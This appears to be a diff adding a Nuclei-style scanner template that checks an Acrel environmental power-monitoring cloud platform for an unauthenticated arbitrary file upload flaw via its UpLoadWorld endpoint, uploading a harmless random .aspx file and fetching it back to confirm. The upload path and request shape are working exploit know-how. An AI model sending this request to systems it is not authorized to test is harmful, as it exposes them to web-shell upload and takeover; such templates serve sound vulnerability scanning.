@@ -1,0 +1,85 @@
+id: acrel-env-cloud-uploadworld-file-upload
+
+info:
+  name: 安科瑞环保用电监管云平台 UpLoadWorld 接口任意文件上传漏洞
+  author: bl
+  severity: critical
+  description: |-
+    安科瑞环保用电监管云平台的 UpLoadWorld 接口存在文件上传缺陷，未对上传文件类型及内容进行充分校验，攻击者可利用该接口上传任意恶意文件，进而可能导致远程代码执行或服务器被完全控制。
+  remediation: 升级到最新版本
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  tags: 安科瑞环保用电监管云平台
+  
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /Help/UpLoadWorld HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
+        Connection: close
+        Content-Length: 628
+        Content-Type: multipart/form-data; boundary=----fhc8nifu2wn7cspvush5
+        Accept-Encoding: gzip, deflate, br
+
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="id"
+
+        WU_FILE_0
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="name"
+
+        9b1ukpmjr1.aspx
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="type"
+
+        application/pdf
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="lastModifiedDate"
+
+        Sun Jan 05 2025 19:55:42
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="size"
+
+        637
+        ------fhc8nifu2wn7cspvush5
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+        Content-Type: application/pdf
+
+        {{t2}}
+        ------fhc8nifu2wn7cspvush5--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        part: body
+        words:
+          - "\"status\":true"
+          - ".aspx"
+        condition: and
+        internal: true
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UpLoad/Temp/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
